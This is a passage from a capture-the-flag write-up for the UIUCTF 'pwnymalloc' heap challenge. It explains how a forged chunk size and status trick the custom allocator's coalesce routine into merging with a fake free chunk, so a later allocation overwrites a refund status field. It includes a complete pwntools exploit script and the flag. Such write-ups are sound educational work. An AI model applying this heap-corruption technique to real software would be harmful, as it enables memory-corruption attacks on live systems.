# creates C and free C to coalesce with fake chunk
idk(b'doesnt matter')
```

looking at from a normal and non-malicious perspective, this is what our heap state before C is free'd

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

however from the exploit's perspective this is where our main focus lies:

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

as we can see, we have poisoned the prev size with the offset/gap between the chunk we want to be merged, in this case,chunk C and the our crafted fake chunk.&#x20;

{% hint style="info" %}
note, our fake chunk size has to be bigger than the normal REFUND chunk in order to use the `free_list` when it later on we will do another allocation.&#x20;
{% endhint %}

notice that we also set the status of our fake chunk to be `FREE`, this is to pass the coalesce status check:

```c
static chunk_ptr coalesce(chunk_ptr block) {
    chunk_ptr prev_block = prev_chunk(block);
    // ...
    
    int prev_status = prev_block == NULL ? -1 : get_status(prev_block);
    // ...

    if (prev_status == FREE) { // <-- set status to be `FREE` satisfy this check
        free_list_remove(prev_block);

        size += get_size(prev_block);
        prev_block->size = pack_size(size, FREE);
        set_btag(prev_block, size);

        return prev_block;
    } 
    // ..
}
```

also, just to be verbose, at this point since we haven't freed any chunks yet, our `free_list` is empty

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

now let's continue the execution and observe our profit when the allocator frees chunk C

here's the heap state after chunk C is freed:

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

as we can observe, chunk C has successfully merged with our fake chunk and has been linked into the `free_list`. and as such chunk B also falls under our fake chunk's data region and we can modify it.

we next just need to request another chunk which will then recycles the linked free chunk (our fake chunk) and send a bunch of `0x1` (literal value for `REFUND_APPROVED`) to overwrite the enum attribute of chunk B.

```python
pwnymalloc(0x4, p32(0x1) * (2 * 10))
```

<figure><img src="../../.gitbook/assets/image (44).png" alt="" width="402"><figcaption></figcaption></figure>

you can also observe the `split()` behaviour into play here, where the free chunk is size `0x120` and as we request a size smaller than it, it splits the chunk and that's why fake chunk size now is `0x90`

and now we can trigger `handle_refund_status()` to profit, win and get the flag. here's the exploit being ran againts the remote server:

<figure><img src="../../.gitbook/assets/image (45).png" alt="" width="563"><figcaption></figcaption></figure>

Below is the full exploit script:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'pwnymalloc.chal.uiuc.tf', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *coalesce
# break *free_list_remove+91
break *pwnymalloc
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chal
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def idk(data):
    log.info('IDK-ing...')
    io.sendlineafter(b'>', b'1')
    io.sendafter(b'complaint:', data.ljust(0x48-1, b'\x00'))
    sleep(0.2)

def pwnymalloc(amount, data):
    sleep(0.2)
    log.info('Pwnymallocing...')
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'refunded:', str(amount).encode())
    io.sendafter(b'request:', data.ljust(0x7f, b'\x00'))
    sleep(0.2)

    io.recvuntil(b'Your request ID is: ')
    return int(io.recvline().strip())

def win(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'ID:', str(idx).encode())

def exploit():
    global io
    io = initialize()

    fake_chunk = b'\x00' * 0x40 + b'\xd0'
    pwnymalloc(0x1, fake_chunk)

    fake_prev = b'\x00' * 0x78 + b'\xd0'
    win_idx = pwnymalloc(0x2, fake_prev) 

    idk(b'doesnt matter')

    pwnymalloc(0x4, p32(0x1) * (2 * 10))
 
    win(win_idx)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% hint style="success" %}
Flag: _**uiuctf{the\_memory\_train\_went\_off\_the\_tracks}**_
{% endhint %}

***
